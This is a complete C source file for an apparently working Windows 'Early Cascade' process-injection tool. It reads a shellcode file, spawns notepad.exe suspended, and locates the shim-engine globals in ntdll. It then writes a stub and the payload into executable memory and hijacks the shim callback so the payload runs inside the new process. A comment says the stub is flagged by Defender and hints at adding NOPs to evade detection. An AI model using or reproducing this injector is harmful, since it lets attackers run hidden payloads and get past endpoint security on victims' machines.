/* 
Credits
- Original PoC @5pider https://github.com/Cracked5pider/earlycascade-injection
- FindOffsets function https://x.com/m4ul3r_0x00/status/1856362500310143174
*/

#include <windows.h>
#include <stdio.h>
#include <ntstatus.h>


typedef struct tagBUFFER {
    PVOID Buffer;
    ULONG Length;
} BUFFER, * PBUFFER;

#define C_PTR( x )  ( PVOID    ) ( x )   
#define U_PTR( x )  ( UINT_PTR ) ( x )   

typedef LONG(WINAPI* RtlGetVersion_t)(POSVERSIONINFOEXW);

INT CheckWindowsVersion() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll) {
        RtlGetVersion_t RtlGetVersion = (RtlGetVersion_t)GetProcAddress(hNtdll, "RtlGetVersion");
        if (RtlGetVersion) {
            OSVERSIONINFOEXW osInfo = { 0 };
            osInfo.dwOSVersionInfoSize = sizeof(osInfo);

            if (RtlGetVersion(&osInfo) == 0) { // STATUS_SUCCESS
                /*printf("Major Version: %lu\n", osInfo.dwMajorVersion);
                printf("Minor Version: %lu\n", osInfo.dwMinorVersion);
                printf("Build Number: %lu\n", osInfo.dwBuildNumber);*/

                if (osInfo.dwMajorVersion == 10) {
                    if (osInfo.dwBuildNumber >= 22000) {
                        return 11;
                    }
                    else {
                        return 10;
                    }
                }
                else {
                    return -1;
                }
            }
            else {
                return -1;
            }
        }
        else {
            return -1;
        }
    }
    else {
        return -1;
    }
}

// Values to overwrite in NTDLL
PVOID g_pfnSE_DllLoaded = NULL;
PVOID g_ShimsEnabled = NULL;

/*
    This signature will be flagged by defender as of 12/18/24 (VirTool:Win64/Casinj.A)
    hint hint ... add some NOPs
*/
unsigned char cascade_stub_x64[] = {
    0x48, 0x83, 0xec, 0x38,                          // sub rsp, 38h
    0x33, 0xc0,                                      // xor eax, eax
    0x45, 0x33, 0xc9,                                // xor r9d, r9d

    0x48, 0x21, 0x44, 0x24, 0x20,                    // and [rsp+38h+var_18], rax

    0x48, 0xba,                                      // 
    0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,  // mov rdx, 8888888888888888h      :::: INDEX: 16

    0xa2,                                            // (offset: 25)
    0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99,  // mov ds:9999999999999999h, al    :::: INDEX: 25

    0x49, 0xb8,                                      // 
    0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77,  // mov r8, 7777777777777777h       :::: INDEX: 35

    0x48, 0x8d, 0x48, 0xfe,                          // lea rcx, [rax-2]

    0x48, 0xb8,                                      // 
    0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66,  // mov rax, 6666666666666666h      :::: INDEX: 49

    0xff, 0xd0,                                      // call rax
    0x33, 0xc0,                                      // xor eax, eax

    0x48, 0x83, 0xc4, 0x38,                          // add rsp, 38h
    0xc3                                             // retn
};


/*
* Locate g_ShimsEnabled and g_pfnSE_DllLoaded on Windows 11 
*/
VOID FindOffsetsWin11()
{
/*
    On Windows 11, functions are ordered differently in ntdll.
    We want to find RtlUnlockMemoryBlockLookaside because it's the closest exported function to
    LdrpLoadShimEngine (which contains the instructions we want).
*/

    PBYTE ptr;
    ULONG offset1, offset2;
    int i = 0;

    // Get the starting address
    ptr = (PBYTE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUnlockMemoryBlockLookaside");
    if (!ptr) {
        printf("[!] Failed to locate RtlUnlockMemoryBlockLookaside\n");
        return;
    }

    // Scan memory until end of LdrpInitializeDllPath function. The next function will be LdrpLoadShimEngine
    while (i != 6) {
        if (*(PWORD)ptr == 0xCCC3) {
            i += 1;
        }
        ptr++;
    }

    /*
        Should locate byte pattern inside of LdrpLoadShimEngine.
        Looking for 0x488B3D  (mov     rdi, qword [rel g_pfnSE_DllLoaded])
    */
    while ((*(PDWORD)ptr & 0xFFFFFF) != 0x3D8B48) {
        ptr++;
    }

    // [ptr is here] mov rdi, qword [rel g_pfnSE_DllLoaded]
    offset1 = *(PULONG)(ptr + 3);               // Add 3 bytes to get to [rel g_pfnSE_DllLoaded]
    g_pfnSE_DllLoaded = ptr + offset1 + 7;      // Find absolute address of function pointer g_pfnSE_DllLoaded (8 bytes)

    /*
        Should locate byte pattern inside of LdrpLoadShimEngine.
        Looking for 0x44382D  (cmp     byte [rel g_ShimsEnabled], r13b)
    */
    while ((*(PDWORD)ptr & 0xFFFFFF) != 0x2D3844) {
        ptr++;
    }

    // [ptr is here] cmp byte [rel g_ShimsEnabled], r12b
    offset2 = *(PULONG)(ptr + 3);           // Add 3 bytes to get to [rel g_ShimsEnabled]
    g_ShimsEnabled = ptr + offset2 + 7;     // Find absolute address of g_ShimsEnabled (8 bytes)
}

/*
* Scan the memory of NTDLL.dll to find the memory addresses of g_ShimsEnabled and g_pfnSE_DllLoaded
*/
VOID FindOffsets()
{
    PBYTE ptr;
    ULONG offset1, offset2;
    int i = 0;

    // Get the starting address
    ptr = (PBYTE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlQueryDepthSList");
    if (!ptr) {
        printf("[!] Failed to locate RtlQueryDepthSList\n");
        return;
    }

    // Scan memory until end of LdrpInitShimEngine (0xC3CC pattern)
    while (i != 2) {
        if (*(PWORD)ptr == 0xCCC3) {
            i += 1;
        }
        ptr++;
    }

    // Scan memory until 0x488B3D pattern (mov rdi, qword [rel g_pfnSE_DllLoaded])
    while ((*(PDWORD)ptr & 0xFFFFFF) != 0x3D8B48) {
        ptr++;
    }

    // [ptr is here] mov rdi, qword [rel g_pfnSE_DllLoaded]
    offset1 = *(PULONG)(ptr + 3);               // Add 3 bytes to get to [rel g_pfnSE_DllLoaded]
    g_pfnSE_DllLoaded = ptr + offset1 + 7;      // Find absolute address of g_pfnSE_DllLoaded (8 bytes)

    // Scan memory until 0x443825 pattern (cmp byte [rel g_ShimsEnabled], r12b)
    while ((*(PDWORD)ptr & 0xFFFFFF) != 0x253844) {
        ptr++;
    }

    // [ptr is here] cmp byte [rel g_ShimsEnabled], r12b
    offset2 = *(PULONG)(ptr + 3);           // Add 3 bytes to get to [rel g_ShimsEnabled]
    g_ShimsEnabled = ptr + offset2 + 7;     // Find absolute address of g_ShimsEnabled (8 bytes)
}

/**
 * @brief
 *  encodes a function pointer using
 *  the SharedUserData->Cookie value
 *
 *  ref: https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html
 *
 * @param FnPointer
 *  function pointer to encode
 *
 * @return
 *  encoded function pointer
 */
LPVOID SysEncodeFnPointer(
    _In_ PVOID FnPointer
) {
    ULONG SharedUserCookie = *(ULONG*)0x7FFE0330;

    return C_PTR(_rotr64(SharedUserCookie ^ U_PTR(FnPointer), SharedUserCookie & 0x3F));
}

/**
 * @brief
 *  inject a shellcode buffer with a
 *  context argument into a child process
 *
 * @param Process
 *  proces name path to spawn as our target
 *
 * @param Payload
 *  payload to inject into the remote process
 *
 * @param Context
 *  context to inject as well into the remote process
 *
 * @return
 *  status of function
 */
NTSTATUS CascadeInject(
    _In_ PSTR    Process,
    _In_ PBUFFER Payload,
    _In_ PBUFFER Context
) {
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFOA        StartupInfo;
    PVOID               Memory = NULL;
    ULONG               Length = NULL;
    ULONG               Offset = NULL;
    ULONG               Status = NULL;
    PVOID               SecMrData = NULL;
    PVOID               SecData = NULL;
    UINT_PTR            g_Value = NULL;
    INT                 winVersion = 0;

    if (!Process || !Payload) {
        return STATUS_INVALID_PARAMETER;
    }

    //
    // resolve the g_ShimsEnabled and g_pfnSE_DllLoaded
    // pointers in the current process which should reflect
    // in the remote process as well (or not).
    // Consider this a hacky solution lol. 
    //

    winVersion = CheckWindowsVersion();

    if (winVersion == 10) {
        // Windows 10
        FindOffsets();
    }
    else {
        // Windows 11
        FindOffsetsWin11();
    }

    printf("[*] Found symbols in NTDLL: \n");
    printf("\t g_ShimsEnabled       : 0x%p\n", g_ShimsEnabled);
    printf("\t g_pfnSE_DllLoaded    : 0x%p\n", g_pfnSE_DllLoaded);

    printf("Press <enter> to continue.\n");
    getchar();


    //
    // prepare and start a child process
    // in a suspended state as our target 
    // 

    RtlSecureZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
    RtlSecureZeroMemory(&StartupInfo, sizeof(StartupInfo));

    StartupInfo.cb = sizeof(StartupInfo);

    if (!CreateProcessA(NULL, Process, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &StartupInfo, &ProcessInfo)) {
        printf("[-] CreateProcessW Failed: %lx\n", GetLastError());
        Status = STATUS_UNSUCCESSFUL;
        goto LEAVE;
    }

    printf("[*] Spawned sacrificial process PID: %d\n", ProcessInfo.dwProcessId);

    //
    // allocate memory in the remote process 
    //

    Length = sizeof(cascade_stub_x64) + Payload->Length;
    if (Context) {
        Length += Context->Length;
    }

    if (!(Memory = VirtualAllocEx(ProcessInfo.hProcess, NULL, Length, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE))) {
        printf("[-] VirtualAllocEx Failed: %lx\n", GetLastError());
        Status = STATUS_UNSUCCESSFUL;
        goto LEAVE;
    }

    printf("[*] Allocated memory in remote process : 0x%p\n", Memory);

    //
    // update the stub and include the g_ShimsEnabled,
    // MmPayload, MmContext and NtQueueApcThread pointers 
    //

    g_Value = U_PTR(Memory) + sizeof(cascade_stub_x64);
    memcpy(&cascade_stub_x64[16], &g_Value, sizeof(PVOID));

    memcpy(&cascade_stub_x64[25], &g_ShimsEnabled, sizeof(PVOID));

    g_Value = U_PTR(Memory) + sizeof(cascade_stub_x64) + Payload->Length;
    if (!Context) {
        g_Value = 0;
    }
    memcpy(&cascade_stub_x64[35], &g_Value, sizeof(PVOID));

    g_Value = U_PTR(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueueApcThread"));
    memcpy(&cascade_stub_x64[49], &g_Value, sizeof(PVOID));

    //
    // Write stub, payload and context into the allocated memory 
    //

    if (!WriteProcessMemory(ProcessInfo.hProcess, C_PTR(U_PTR(Memory) + Offset), cascade_stub_x64, sizeof(cascade_stub_x64), NULL)) {
        printf("[-] WriteProcessMemory Failed: %lx\n", GetLastError());
        Status = STATUS_UNSUCCESSFUL;
        goto LEAVE;
    }


    Offset += sizeof(cascade_stub_x64);     // Offset for shellcode
    // Write Shellcode to memory right after cascade stub
    if (!WriteProcessMemory(ProcessInfo.hProcess, C_PTR(U_PTR(Memory) + Offset), Payload->Buffer, Payload->Length, NULL)) {
        printf("[-] WriteProcessMemory Failed: %lx\n", GetLastError());
        Status = STATUS_UNSUCCESSFUL;
        goto LEAVE;
    }

    if (Context) {
        //
        // if specified a context then write the context
        // into the remote process memory as well 
        //
        Offset += Payload->Length;
        if (!WriteProcessMemory(ProcessInfo.hProcess, C_PTR(U_PTR(Memory) + Offset), Context->Buffer, Context->Length, NULL)) {
            printf("[-] WriteProcessMemory Failed: %lx\n", GetLastError());
            Status = STATUS_UNSUCCESSFUL;
            goto LEAVE;
        }
    }

    //
    // patch the remote process pointers and enable the shim engine
    //

    g_Value = TRUE;
    if (!WriteProcessMemory(ProcessInfo.hProcess, g_ShimsEnabled, &g_Value, sizeof(BYTE), NULL)) {
        printf("[-] WriteProcessMemory Failed: %lx\n", GetLastError());
        Status = STATUS_UNSUCCESSFUL;
        goto LEAVE;
    }

    g_Value = U_PTR(SysEncodeFnPointer(Memory));
    if (!WriteProcessMemory(ProcessInfo.hProcess, g_pfnSE_DllLoaded, &g_Value, sizeof(PVOID), NULL)) {
        printf("[-] WriteProcessMemory Failed: %lx\n", GetLastError());
        Status = STATUS_UNSUCCESSFUL;
        goto LEAVE;
    }

    if (!ResumeThread(ProcessInfo.hThread)) {
        printf("[-] ResumeThread Failed: %ld\n", GetLastError());
        Status = STATUS_UNSUCCESSFUL;
        goto LEAVE;
    };

    Status = STATUS_SUCCESS;
LEAVE:
    if (ProcessInfo.hThread) {
        CloseHandle(ProcessInfo.hThread);
    }

    if (ProcessInfo.hProcess) {
        CloseHandle(ProcessInfo.hProcess);
    }

    return Status;
}

BOOL FileReadA(
    _In_  PSTR   FileName,
    _Out_ PVOID* Buffer,
    _Out_ PULONG Length
) {
    HANDLE FileHandle = NULL;
    ULONG  BytesRead = NULL;
    BOOL   Success = NULL;

    if (!FileName || !Buffer || !Length) {
        goto LEAVE;
    }

    Success = FALSE;

    if ((FileHandle = CreateFileA(FileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFileA Failed: %ld\n", GetLastError());
        goto LEAVE;
    }

    if ((*Length = GetFileSize(FileHandle, NULL)) == INVALID_FILE_SIZE) {
        printf("[-] GetFileSize Failed: %ld\n", GetLastError());
        goto LEAVE;
    }

    if (!(*Buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *Length))) {
        printf("[!] HeapAlloc Failed: %ld\n", GetLastError());
        goto LEAVE;
    }

    if (!ReadFile(FileHandle, *Buffer, *Length, &BytesRead, NULL) || *Length != BytesRead) {
        printf("[!] ReadFile Failed With Error: %d\n", GetLastError());
        goto LEAVE;
    }

    Success = TRUE;

LEAVE:
    if (FileHandle != INVALID_HANDLE_VALUE) {
        CloseHandle(FileHandle);
    }

    if (!Success) {
        HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, *Buffer);
        *Buffer = NULL;
        *Length = 0;
    }

    return Success;
}

int main(int argc, char** argv) {
    BUFFER Payload;

    if (argc <= 1) {
        printf("[-] Not enough arguments\n");
        printf("[*] Example: %s [shellcode.bin]\n", argv[0]);
        return -1;
    }

    if (!FileReadA(argv[1], &Payload.Buffer, &Payload.Length)) {
        printf("[-] Failed to read file %s", argv[1]);
        return -1;
    }

    const char* ProcessName = "C:\\Windows\\System32\\notepad.exe";

    CascadeInject((PSTR)ProcessName, &Payload, NULL);

    printf("[*] Finished\n");

    return 0;
}